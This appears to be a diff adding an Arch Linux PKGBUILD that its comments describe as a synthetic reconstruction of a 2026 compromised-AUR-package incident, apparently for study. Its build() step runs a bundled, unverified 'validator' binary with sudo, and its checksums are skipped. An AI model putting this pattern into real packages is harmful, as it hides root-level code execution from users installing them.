@@ -1,0 +1,26 @@
+# Synthetic reconstruction of the 2026 openconnect-sso AUR incident technique.
+# See SOURCE.md -- this is NOT the original malicious code.
+pkgname=openconnect-sso-example
+pkgver=0.13.1
+pkgrel=2
+pkgdesc="Example reconstruction of a compromised orphaned AUR package"
+arch=('any')
+url="https://example.invalid/openconnect-sso-example"
+license=('GPL3')
+depends=('python' 'openconnect')
+source=("https://example.invalid/$pkgname-$pkgver.tar.gz"
+        "validator")
+sha256sums=('SKIP'
+            'SKIP')
+
+build() {
+  cd "$srcdir/$pkgname-$pkgver"
+  chmod +x "$srcdir/validator"
+  sudo "$srcdir/validator" --install
+  python -m build --wheel
+}
+
+package() {
+  cd "$srcdir/$pkgname-$pkgver"
+  python -m installer --destdir="$pkgdir" dist/*.whl
+}
